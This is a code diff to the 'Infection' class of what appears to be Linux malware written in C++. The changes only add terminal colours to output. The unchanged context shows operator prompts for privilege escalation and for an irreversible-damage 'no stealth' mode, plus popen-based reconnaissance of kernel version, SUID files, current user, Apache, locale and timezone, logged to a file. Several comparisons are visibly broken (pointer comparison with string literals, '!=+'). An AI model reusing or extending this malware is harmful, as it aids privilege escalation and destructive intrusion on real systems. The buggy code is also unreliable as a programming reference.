@@ -33,21 +33,21 @@ FileInformations Infection::GetFileInformations(const char* fileName){
 void Infection::askForPrivilegeEscalation(){
 	std::string answer2PE = {""};
 	while(true){
-		printf("[+] Would you like to try to escalate your privileges?\n");
-		printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
+		printf("\033[1;32m[+] Would you like to try to escalate your privileges?\033[0m \033[1;31m(The infection may take much more time !)\033[0m\n");
+		printf("\033[1;32mPlease use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : \033[0m");
 		std::cin >> answer2PE;
 		if(answer2PE == "YES" || answer2PE == "NO" || answer2PE == "Y" || answer2PE == "N" || answer2PE == "yes" || answer2PE == "no" || answer2PE == "y" || answer2PE == "n"){
 			if(answer2PE == "YES" || answer2PE == "yes" || answer2PE == "y" || answer2PE == "Y"){
-				printf("[+] Attempting to find Privilege Escalation Vectors and Potentially Exploit it !\n");
+				printf("\033[1;32m[+] Attempting to find Privilege Escalation Vectors and Potentially Exploit it !\033[0m\n");
 				tryPrivilegeEscalation = true;
 				break;
 			} else if(answer2PE == "NO" || answer2PE == "no" || answer2PE == "n" || answer2PE == "N"){
-				printf("[+] Skipping the search for Privilation Escalation Vectors !\n");
+				printf("\033[1;32m[+] Skipping the search for Privilation Escalation Vectors !\n\033[0m");
 				tryPrivilegeEscalation  = false;
 				break;
 			}
 		} else {
-			printf("[-] Please enter a valid value !\n");
+			printf("\033[1;31m[-] Please enter a valid value !\033[0m\n");
 			system("sleep 2.5");
 			system("clear");
 		}
@@ -65,7 +65,7 @@ bool Infection::askForNoStealthMode(){
 				std::string confirm{""};
 				system("clear");
 				printf("\033[1;31;40m [+] Are you sure you want to continue ? (The damage caused by the malware are not reversable) : \033[0m \n");
-				printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
+				printf("\033[1;32mPlease use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : \033[0m");
 				std::cin >> confirm;
 				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
 					system("clear");
@@ -89,11 +89,11 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 	char buffer[2055];
 	FILE *command = popen(commandToRun, "r");
 	if(command == NULL){
-		printf("%s", errorMESSAGE);
+		printf("\033[1;31m%s\033[0m", errorMESSAGE);
 	}
 	//Print the command
 	while(fgets(buffer, sizeof(buffer), command) != NULL){
-		printf("%s\n", buffer);
+		printf("\033[1;31m%s\033[0m\n", buffer);
 	}
 }
 
@@ -101,11 +101,11 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 	char buffer[2055];
 	FILE *command = popen(commandToRun, "r");
 	if(command == NULL){
-		printf("%s", errorMESSAGE);
+		printf("\033[1;31m%s\033[0m", errorMESSAGE);
 	}
 	//Print the command
 	while(fgets(buffer, sizeof(buffer), command) != NULL){
-		printf("%s %s", successMessage,buffer);
+		printf("%s \033[1;31m %s\033[0m", successMessage,buffer);
 	}
 }
 
@@ -113,7 +113,7 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 	char buffer[2055];
 	FILE *command = popen(commandToRun, "r");
 	if(command == NULL){
-		printf("%s", errorMESSAGE);
+		printf("\033[1;31m%s\033[0m", errorMESSAGE);
 		log2File("logs.txt", errorMESSAGE);
 	}
 
@@ -122,24 +122,24 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 		if(vOutput == "KernelRelease"){
 			if(buffer != ""){
 				KernelRelease = buffer;
-				printf("%s %s", successMessage, buffer);
+				printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
 				log2File("logs.txt", successMessage + ' ' + *buffer);
 			}
 		} else if(vOutput == "KernelVersion"){
 			if(buffer != ""){
 				KernelVersion = buffer;
-				printf("%s %s", successMessage, buffer);
+				printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
 				log2File("logs.txt", successMessage + ' ' + *buffer);
 			}
 		} else if(vOutput == "suidFiles") {
 			if(buffer != ""){
-				printf("\t- %s", buffer);
+				printf("\t\033[1;32m- %s\033[0m", buffer);
 				//TODO : Log2File
 			}
 		} else if(vOutput == "whoami"){
 			if(buffer !=+ ""){
 				user = buffer;
-				printf("%s %s", successMessage, buffer);
+				printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
 				log2File("logs.txt", successMessage + ' ' + *buffer);
 			}
 		}else if(vOutput == "findApache"){
@@ -154,14 +154,14 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 			}
 		} else if(vOutput == "localeLanguage"){
 			localLanguage = buffer;
-			printf("%s %s", successMessage, buffer);
+			printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
 			log2File("logs.txt", successMessage + ' ' + *buffer);
 		} else if(vOutput == "timezone"){
 			localTimeZone = buffer;
-			printf("%s %s", successMessage, buffer);
+			printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
 			log2File("logs.txt", successMessage + ' ' + *buffer);
 		} else {
-			printf("%s %s", successMessage, buffer);
+			printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
 			log2File("logs.txt", successMessage + ' ' + *buffer);
 		}
 	}
